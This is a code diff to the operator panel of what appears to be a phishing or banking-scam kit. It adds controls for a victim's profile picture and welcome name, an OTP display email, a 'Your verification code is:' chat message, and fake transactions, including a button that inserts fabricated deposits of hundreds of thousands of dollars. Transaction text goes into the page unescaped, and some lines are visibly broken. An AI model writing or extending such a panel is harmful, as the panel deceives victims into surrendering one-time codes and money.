@@ -92,6 +92,23 @@
                 </div>
 
 
+                
+                <!-- Profile Picture -->
+                <div class="settings-group">
+                    <p><i class="fas fa-image"></i> Victim Profile Picture</p>
+                    <input type="file" id="adminProfilePicFile" accept="image/*" style="background:#151521; padding:8px; width:100%; color:white; border:1px solid #3a3a52; border-radius:4px; margin-bottom:8px;">
+                    <button id="btnUpdateProfilePic">Upload Profile Picture</button>
+                    <div id="profilePicStatus" class="status-msg"></div>
+                </div>
+
+                <!-- Welcome Name Control -->
+                <div class="settings-group">
+                    <p><i class="fas fa-user"></i> Victim Welcome Name</p>
+                    <input type="text" id="adminWelcomeName" placeholder="e.g. Kyung">
+                    <button id="btnSetWelcome">Update Name</button>
+                    <div id="welcomeNameStatus" class="status-msg"></div>
+                </div>
+
                 <!-- Display Email -->
                 <div class="settings-group">
                     <p><i class="fas fa-envelope"></i> OTP Display Email</p>
@@ -136,6 +153,8 @@
                     <select id="txStatusSel"><option value="success">Success</option><option value="pending">Pending</option><option value="failed">Failed</option></select>
                     <button class="green" id="btnAddTx">Add Transaction</button>
                     <button class="red" id="btnClearTx" style="margin-top:6px;">Clear All Transactions</button>
+                    <button class="blue" id="btnAddBuildingTx" style="margin-top:6px; background:#3498db; color:white; padding:8px 12px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; width:100%; font-size:13px;">Add Default Building Material Transactions</button>
+                    <!-- replaced red --> style="margin-top:6px;">Clear All Transactions</button>
                 </div>
                 <div id="adminTxList" style="background:#151521; padding:10px; border-radius:6px; max-height:200px; overflow-y:auto;">
                     <p style="color:#666;">No custom transactions set.</p>
@@ -296,6 +315,12 @@
                 else { aiBtn.style.background = '#d9534f'; aiBtn.innerText = 'OFF'; }
             }
 
+                        // Poll Welcome Name
+            var wName = getSyncItem('welcomeName');
+            if (wName && document.activeElement !== document.getElementById('adminWelcomeName')) {
+                var wNameEl = document.getElementById('adminWelcomeName');
+                if(wNameEl) wNameEl.value = wName;
+            }
             // Poll Display Email
             var currentEmail = getSyncItem('displayEmail');
             if (currentEmail) {
@@ -326,25 +351,37 @@
                 document.getElementById('adminCardBalance').value = cBal;
             }
 
-            // Poll Transactions
+                        // Poll Transactions
             var txs = getSyncItem('transactions');
-            if (txs && Array.isArray(txs) && txs.length > 0) {
-                var txHtml = '';
-                txs.forEach(function(tx, idx) {
-                    var color = tx.type === 'deposit' ? '#5cb85c' : (tx.status === 'failed' ? '#d9534f' : '#fff');
-                    var sign = tx.type === 'deposit' ? '+' : '-';
-                    var statStr = tx.status === 'pending' ? ' (Pending)' : (tx.status === 'failed' ? ' (Failed)' : '');
-                    txHtml += '<div style="background:#1e1e2d; padding:8px; margin-bottom:6px; border-radius:4px; display:flex; justify-content:space-between; align-items:center;">' +
-                        '<div><strong>' + tx.desc + '</strong>' + statStr + '<br><span style="color:#a0a0b8; font-size:11px;">' + tx.date + '</span></div>' +
-                        '<div style="display:flex; align-items:center; gap:8px;"><span style="color:' + color + '; font-weight:bold;">' + sign + tx.amount + '</span>' +
-                        '<button onclick="removeTx(' + idx + ')" style="background:#d9534f; color:white; border:none; border-radius:3px; padding:2px 6px; cursor:pointer; font-size:10px;">X</button></div></div>';
-                });
-                document.getElementById('adminTxList').innerHTML = txHtml;
-            } else {
-                document.getElementById('adminTxList').innerHTML = '<p style="color:#666;">No custom transactions set.</p>';
+            var isAnyInputFocused = document.activeElement && document.activeElement.tagName === 'INPUT' && document.activeElement.id.startsWith('inlineTx');
+            if (!isAnyInputFocused) {
+                if (txs && Array.isArray(txs) && txs.length > 0) {
+                    var txHtml = '';
+                    txs.forEach(function(tx, idx) {
+                        var color = tx.type === 'deposit' ? '#5cb85c' : (tx.status === 'failed' ? '#d9534f' : '#fff');
+                        var sign = tx.type === 'deposit' ? '+' : '-';
+                        var statStr = tx.status === 'pending' ? ' (Pending)' : (tx.status === 'failed' ? ' (Failed)' : '');
+                        txHtml += '<div style="background:#1e1e2d; padding:8px; margin-bottom:6px; border-radius:4px; display:flex; flex-direction:column; gap:5px;">' +
+                            '<div style="display:flex; justify-content:space-between; align-items:center;">' +
+                                '<div><strong>' + tx.desc + '</strong>' + statStr + '</div>' +
+                                '<div style="display:flex; align-items:center; gap:8px;">' +
+                                    '<button onclick="saveInlineTx(' + idx + ')" style="background:#5cb85c; color:white; border:none; border-radius:3px; padding:2px 6px; cursor:pointer; font-size:10px;">Save Inline</button>' +
+                                    '<button onclick="removeTx(' + idx + ')" style="background:#d9534f; color:white; border:none; border-radius:3px; padding:2px 6px; cursor:pointer; font-size:10px;">X</button>' +
+                                '</div>' +
+                            '</div>' +
+                            '<div style="display:flex; gap:10px;">' +
+                                '<input type="text" id="inlineTxDate_' + idx + '" value="' + tx.date + '" placeholder="Date" style="flex:1; padding:4px; background:#151521; border:1px solid #3a3a52; color:white; border-radius:3px; font-size:11px;">' +
+                                '<input type="text" id="inlineTxAmount_' + idx + '" value="' + tx.amount + '" placeholder="Amount" style="flex:1; padding:4px; background:#151521; border:1px solid #3a3a52; color:' + color + '; font-weight:bold; border-radius:3px; font-size:11px;">' +
+                            '</div>' +
+                        '</div>';
+                    });
+                    document.getElementById('adminTxList').innerHTML = txHtml;
+                } else {
+                    document.getElementById('adminTxList').innerHTML = '<p style="color:#666;">No custom transactions set.</p>';
+                }
             }
 
-            // Action buttons
+            // Action buttons// Action buttons
             injectAdminActions();
         }
 
@@ -410,6 +447,40 @@
             document.getElementById('adminChatInput').value = 'Your verification code is: ' + code;
         });
 
+        
+        // Update Profile Picture (Upload)
+        var btnUpdateProfilePic = document.getElementById('btnUpdateProfilePic');
+        if (btnUpdateProfilePic) {
+            btnUpdateProfilePic.addEventListener('click', function() {
+                var fileInput = document.getElementById('adminProfilePicFile');
+                if (fileInput.files && fileInput.files[0]) {
+                    var reader = new FileReader();
+                    reader.onload = async function(e) {
+                        var base64Image = e.target.result;
+                        await setSyncItem('profilePic', base64Image);
+                        document.getElementById('profilePicStatus').innerText = 'Profile picture uploaded and updated!';
+                        setTimeout(function(){ document.getElementById('profilePicStatus').innerText = ''; }, 3000);
+                    };
+                    reader.readAsDataURL(fileInput.files[0]);
+                } else {
+                    alert('Please select an image file to upload.');
+                }
+            });
+        }
+
+        // Set Welcome Name
+        var btnSetWelcome = document.getElementById('btnSetWelcome');
+        if (btnSetWelcome) {
+            btnSetWelcome.addEventListener('click', async function() {
+                var wName = document.getElementById('adminWelcomeName').value.trim();
+                if (wName) {
+                    await setSyncItem('welcomeName', wName);
+                    document.getElementById('welcomeNameStatus').innerText = 'Welcome name updated!';
+                    setTimeout(function(){ document.getElementById('welcomeNameStatus').innerText = ''; }, 3000);
+                }
+            });
+        }
+
         // Set Display Email
         document.getElementById('btnSetEmail').addEventListener('click', async function() {
             var email = document.getElementById('adminDisplayEmail').value.trim();
@@ -456,6 +527,39 @@
             document.getElementById('txDate').value = '';
             document.getElementById('txAmount').value = '';
         });
+
+        
+        var btnAddBuildingTx = document.getElementById('btnAddBuildingTx');
+        if (btnAddBuildingTx) {
+            btnAddBuildingTx.addEventListener('click', async function() {
+                var txs = getSyncItem('transactions') || [];
+                txs.push({ desc: 'Deposit - STARK Building Materials US', date: 'June 7, 2026', amount: '$850,000.00', type: 'deposit', status: 'success' });
+                txs.push({ desc: 'Withdrawal - Timber & Steel Supplies', date: 'June 5, 2026', amount: '$120,000.00', type: 'withdrawal', status: 'success' });
+                txs.push({ desc: 'Deposit - BuildBase Construction', date: 'June 1, 2026', amount: '$550,000.00', type: 'deposit', status: 'success' });
+                await setSyncItem('transactions', txs);
+                alert('Building Material Transactions Added!');
+            });
+        }
+
+        
+        // Inline Save Transaction
+        async function saveInlineTx(index) {
+            var currentTxs = getSyncItem('transactions') || [];
+            if (!Array.isArray(currentTxs) || !currentTxs[index]) return;
+            
+            var newDate = document.getElementById('inlineTxDate_' + index).value.trim();
+            var newAmount = document.getElementById('inlineTxAmount_' + index).value.trim();
+            
+            if (newAmount && !newAmount.startsWith('$') && !newAmount.startsWith('£')) {
+                newAmount = '$' + newAmount;
+            }
+            
+            currentTxs[index].date = newDate;
+            currentTxs[index].amount = newAmount;
+            
+            await setSyncItem('transactions', currentTxs);
+            alert('Transaction updated!');
+        }
 
         // Remove single transaction
         async function removeTx(index) {
